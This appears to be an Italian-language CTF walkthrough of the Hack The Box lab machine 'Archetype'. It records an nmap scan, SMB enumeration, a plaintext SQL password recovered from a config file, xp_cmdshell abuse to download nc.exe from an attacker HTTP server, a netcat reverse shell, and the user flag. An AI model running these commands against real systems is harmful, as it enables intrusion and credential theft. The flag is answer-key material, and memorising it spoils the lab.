....
export IP=10.10.10.27 //creo una variabile temporanea con l'ip cosi lo posso prendere sempre
....

....
Porte aperte

sudo nmap -sC -sV -A $IP -oN namp_scan_1

PORT     STATE SERVICE      VERSION
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds Windows Server 2019 Standard 17763 microsoft-ds
1433/tcp open  ms-sql-s     Microsoft SQL Server 2017 14.00.1000.00; RTM

Target_Name: ARCHETYPE

smb detected

Computer name: Archetype

account_used: guest
authentication_level: user (non dovrebbe servire una password)
....

--> Non essendoci un web server non posso andare a vedere nel browser

....
Provo a connettermi con smb

smbclient -L //$IP/


        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        backups         Disk
        C$              Disk      Default share
        IPC$            IPC       Remote IPC

--> posso entrare sono il backups

smbclient  //10.10.10.27/backups

--> entro e torno alla root

smb: \> cd ..
smb: \> ls
  .                                   D        0  Mon Jan 20 07:20:57 2020
  ..                                  D        0  Mon Jan 20 07:20:57 2020
  prod.dtsConfig                     AR      609  Mon Jan 20 07:23:02 2020

                10328063 blocks of size 4096. 8248834 blocks available

--> vedo il file prod.dtsConfig ne guardo le informazioni

smb: \> allinfo prod.dtsConfig
altname: PROD~1.DTS
create_time:    Mon Jan 20 07:20:57 AM 2020 EST
access_time:    Mon Jan 20 07:23:02 AM 2020 EST
write_time:     Mon Jan 20 07:23:02 AM 2020 EST
change_time:    Mon Jan 20 07:23:18 AM 2020 EST
attributes: RA (21)
stream: [::$DATA], 609 bytes

--> contiene dei dati (lo scarico con get), lo apro

<DTSConfiguration>
    <DTSConfigurationHeading>
        <DTSConfigurationFileInfo GeneratedBy="..." GeneratedFromPackageName="..." GeneratedFromPackageID="..." GeneratedDate="20.1.2019 10:01:34"/>
    </DTSConfigurationHeading>
    <Configuration ConfiguredType="Property" Path="\Package.Connections[Destination].Properties[ConnectionString]" ValueType="String">
        <ConfiguredValue>Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;</ConfiguredValue>
    </Configuration>
</DTSConfiguration>


....

....
--> vedo che contiene delle credenziali sql, provo a connetermi con mssqlclinet e la password trovata (windows-auth specifico che sono su una macchina windwos)

impacket-mssqlclient sql_svc:M3g4c0rp123@$IP -windows-auth

--> una volta dentro controllo se è presente powershell

--> è presente ma non riesco a connetermi
....

....
--> scarico nc.exe da github

--> creo un server con python in un altro terminale

python3 -m http.server

--> sfrutto la powershel per indirizzarmi sul server

xp_cmdshell powershell wger http://10.10.14.201:8000/nc.exe -OutFile %TEMP%\nc.exe


--> attivo necat su un terminale alla porta 1234
nc -lnvp 1234

--> dalla powershell dico di eseguire cmd.exe
xp_cmdshell powershell "%TEMP%\nc.exe 10.10.14.201 1234 -e cmd.exe

--> una volta avuto accesso al promt giro a caso cercando informazioni

C:\Users\sql_svc\Desktop>type user.txt

--> sul desktop dell'utente sql_svc trovo il file contenete la flag
3e7b102e78218e935bf3f4951fec21a3
....
